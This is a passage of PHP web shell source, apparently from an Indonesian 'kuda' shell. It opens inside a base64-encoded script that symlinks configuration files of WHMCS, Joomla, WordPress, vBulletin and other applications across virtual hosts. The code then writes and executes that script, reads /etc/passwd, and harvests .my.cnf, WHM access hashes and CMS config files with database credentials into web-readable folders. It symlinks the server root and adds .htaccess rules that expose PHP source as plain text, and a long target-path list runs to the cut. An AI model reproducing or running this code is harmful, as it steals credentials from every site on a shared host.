V0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
        $file = "kuda_config/vhost.cin";
        $handle = fopen($file ,"w+");
        fwrite($handle ,base64_decode($vhost));
        fclose($handle);
        chmod($file, 0755);
        if(exe("cd kuda_config && ./vhost.cin")) {
            echo "<center><a href='$link_config/kuda_config'><font color=lime>DONE</font></a></center>";
        } else {
            echo "<center><a href='$link_config/kuda_config/vhost.cin'><font color=lime>DONE</font></a></center>";
        }
 
    } else {
        $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red><i>Can't read /etc/passwd</i></font></pre>");
        while($passwd = fgets($etc)) {
            if($passwd == "" || !$etc) {
                echo "<font color=red><i>Can't read /etc/passwd</i></font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_config);
                foreach($user_config[1] as $user_kuda) {
                    $user_config_dir = "/home/$user_kuda/public_html/";
                    if(is_readable($user_config_dir)) {
                        $grab_config = array(
                            "/home/$user_kuda/.my.cnf" => "cpanel",
                            "/home/$user_kuda/.accesshash" => "WHM-accesshash",
                            "$user_config_dir/po-content/config.php" => "Popoji",
                            "$user_config_dir/vdo_config.php" => "Voodoo",
                            "$user_config_dir/bw-configs/config.ini" => "BosWeb",
                            "$user_config_dir/config/koneksi.php" => "Lokomedia",
                            "$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
                            "$user_config_dir/clientarea/configuration.php" => "WHMCS",
                            "$user_config_dir/whm/configuration.php" => "WHMCS",
                            "$user_config_dir/whmcs/configuration.php" => "WHMCS",
                            "$user_config_dir/forum/config.php" => "phpBB",
                            "$user_config_dir/sites/default/settings.php" => "Drupal",
                            "$user_config_dir/config/settings.inc.php" => "PrestaShop",
                            "$user_config_dir/app/etc/local.xml" => "Magento",
                            "$user_config_dir/joomla/configuration.php" => "Joomla",
                            "$user_config_dir/configuration.php" => "Joomla",
                            "$user_config_dir/wp/wp-config.php" => "WordPress",
                            "$user_config_dir/wordpress/wp-config.php" => "WordPress",
                            "$user_config_dir/wp-config.php" => "WordPress",
                            "$user_config_dir/admin/config.php" => "OpenCart",
                            "$user_config_dir/slconfig.php" => "Sitelok",
                            "$user_config_dir/application/config/database.php" => "Ellislab");
                        foreach($grab_config as $config => $nama_config) {
                            $ambil_config = file_get_contents($config);
                            if($ambil_config == '') {
                            } else {
                                $file_config = fopen("kuda_config/$user_kuda-$nama_config.txt","w");
                                fputs($file_config,$ambil_config);
                            }
                        }
                    }      
                }
            }  
        }
    echo "<center><a href='?dir=$dir/kuda_config'><font color=lime>DONE</font></a></center>";
    }
}
elseif($_GET['do'] == 'configv2') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
if($_POST){	if($_POST['config'] == 'symvhosts') {
@mkdir("kuda_symvhosts", 0777);
exe("ln -s / kuda_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks\nDirectoryIndex kuda.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any";
@file_put_contents("kuda_symvhosts/.htaccess",$htaccess);
$etc_passwd=$_POST['passwd'];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$kuda = preg_replace('//var/www/vhosts//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php kuda_symvhosts/".$kuda."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php kuda_symvhosts/".$kuda."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php kuda_symvhosts/".$kuda."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php kuda_symvhosts/".$kuda."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php kuda_symvhosts/".$kuda."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php kuda_symvhosts/".$kuda."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml kuda_symvhosts/".$kuda."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php kuda_symvhosts/".$kuda."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php kuda_symvhosts/".$kuda."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("kuda_symconfig", 0777);
@symlink("/","kuda_symconfig/root");
$htaccess="Options Indexes FollowSymLinks\nDirectoryIndex kuda.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any";
@file_put_contents("kuda_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("kuda_sym404", 0777);
@symlink("/","kuda_sym404/root");
$htaccess="Options Indexes FollowSymLinks\nDirectoryIndex kuda.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any\nIndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*\nIndexIgnore *.txt404\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} ^.*kuda_sym404 [NC]\nRewriteRule .txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("kuda_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
mkdir("kuda_configv2", 0777);
$isi_htc = "Options all\nRequire None\nSatisfy Any";
$htc = fopen("kuda_configv2/.htaccess","w");
fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_kuda) {
$grab_config = array(
"/home/$user_kuda/.accesshash" => "WHM-accesshash",
"/home/$user_kuda/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_kuda/public_html/forum/config.php" => "phpBB",
"/home/$user_kuda/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_kuda/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_kuda/public_html/app/etc/local.xml" => "Magento",
"/home/$user_kuda/public_html/admin/config.php" => "OpenCart",
"/home/$user_kuda/public_html/application/config/database.php" => "Ellislab",
"/home/$user_kuda/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_kuda/public_html/includes/config.php" => "Vbulletin",
"/home/$user_kuda/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_kuda/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_kuda/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_kuda/public_html/inc/config.php" => "MyBB",
"/home/$user_kuda/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_kuda/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_kuda/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_kuda/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_kuda/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_kuda/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_kuda/public_html/inc/conf_global.php" => "IPB",
"/home/$user_kuda/public_html/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_kuda/public_html/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/blog/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/submitticket.php" => "^WHMCS",
"/home/$user_kuda/public_html/cms/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/beta/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/portal/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/site/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/main/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/home/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/demo/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/test/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/v1/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/v2/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/new/configuration.php" => "Joomla",
"/home/$user_kuda/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/manage/submitticket.php" => "WHMCS",
